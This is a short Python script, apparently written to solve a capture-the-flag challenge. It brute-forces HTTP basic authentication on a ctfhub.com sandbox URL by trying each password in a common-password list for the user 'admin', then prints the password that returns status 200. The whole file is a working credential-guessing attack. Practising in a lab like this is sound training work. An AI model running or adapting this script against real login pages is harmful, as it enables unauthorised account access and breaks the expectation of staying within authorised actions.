import requests

def req(username,password):
    r = requests.get(
        url = 'http://challenge-4da4ea7104f63bc7.sandbox.ctfhub.com:10800/flag.html',
        auth=(username,password)
        )
    
    print(r.content.decode(),"\n")
    if(r.status_code == 200):
        print(password)
        exit(0)
    

with open('10_million_password_list_top_100.txt', 'r') as file:
    for line in file:
        # print("Current:",line,"\n")
        req('admin',line.strip())